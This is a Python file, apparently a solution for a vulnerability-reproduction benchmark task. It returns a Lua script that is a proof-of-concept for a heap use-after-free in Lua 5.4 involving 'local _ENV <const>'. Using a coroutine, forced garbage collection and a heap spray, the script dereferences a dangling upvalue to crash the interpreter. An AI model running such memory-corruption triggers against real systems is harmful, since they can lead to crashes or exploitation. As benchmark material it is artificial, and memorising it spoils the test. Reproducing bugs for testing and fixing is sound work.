import sys

class Solution:
    def solve(self, src_path: str) -> bytes:
        # The vulnerability is a Heap Use-After-Free in Lua 5.4 related to 'local _ENV <const>'.
        # The compiler generates incorrect code that fails to properly close the upvalue associated
        # with the const environment variable when the scope (stack frame) is destroyed.
        # This PoC uses a coroutine to create a stack frame, captures the _ENV in a closure,
        # finishes the coroutine (invalidating the stack), and then accesses the closure.
        
        poc_code = r'''
-- PoC for Heap Use After Free in Lua (arvo:44597)
-- Target: Lua 5.4.x (prior to fix for local _ENV <const>)

-- 1. Helper for Heap Spraying
-- We want to overwrite the freed stack memory with controlled data
local function spray_heap()
    local t = {}
    for i = 1, 5000 do
        -- Create tables and strings to fill memory
        t[i] = {
            padding = string.rep("P", 64),
            x = i,
            f = function() return i end
        }
    end
    return t
end

-- 2. Trigger Function
local function get_vulnerable_closure()
    -- We use a coroutine so we can explicitly control the stack lifetime
    local function thread_func()
        -- Capture global 'coroutine.yield' because we are about to change _ENV
        local yield = coroutine.yield
        
        -- This table acts as our environment. 
        -- If UAF happens, the upvalue pointing to this (on stack) becomes invalid.
        local t = { 
            target = "SecretData" 
        }
        
        -- VULNERABILITY: 
        -- Declaring _ENV as a local const variable.
        -- The compiler may optimize this in a way that the upvalue is not marked 
        -- to be closed (migrated to heap) when the function returns.
        local _ENV <const> = t
        
        -- Create a closure that captures _ENV.
        -- 'target' resolves to _ENV.target.
        local function inner()
            return target
        end
        
        -- Pass the closure out
        yield(inner)
    end

    local co = coroutine.create(thread_func)
    local ok, closure = coroutine.resume(co)
    
    if not ok then
        print("Error creating coroutine: " .. tostring(closure))
        return nil
    end

    -- Resume the coroutine again to let it return.
    -- This destroys the stack frame of 'thread_func'.
    -- If the bug exists, the 'inner' closure still has an open upvalue pointing 
    -- to the now-freed stack slot of 't'.
    coroutine.resume(co)
    
    return closure, co
end

print("[*] Generating vulnerable closure...")
local bad_closure, dead_co = get_vulnerable_closure()

if not bad_closure then
    print("[!] Failed to generate closure")
    return
end

-- 3. Force Memory Corruption
-- Drop reference to coroutine to allow GC
dead_co = nil
-- Force full garbage collection cycles
collectgarbage()
collectgarbage()

-- Spray heap to reuse the memory previously occupied by the coroutine stack
local memory_holder = spray_heap()

print("[*] Triggering UAF access...")

-- 4. Trigger
-- Accessing the closure should dereference the dangling upvalue.
-- If successful, this causes a crash (ASAN error) or reads garbage.
local status, result = pcall(bad_closure)

if not status then
    print("[!] Crash avoided or handled: " .. tostring(result))
else
    print("[!] Result (should be UAF/Garbage): " .. tostring(result))
end

-- Ensure crash if pcall masked it (though ASAN should catch it regardless)
bad_closure()
'''
        return poc_code.encode('utf-8')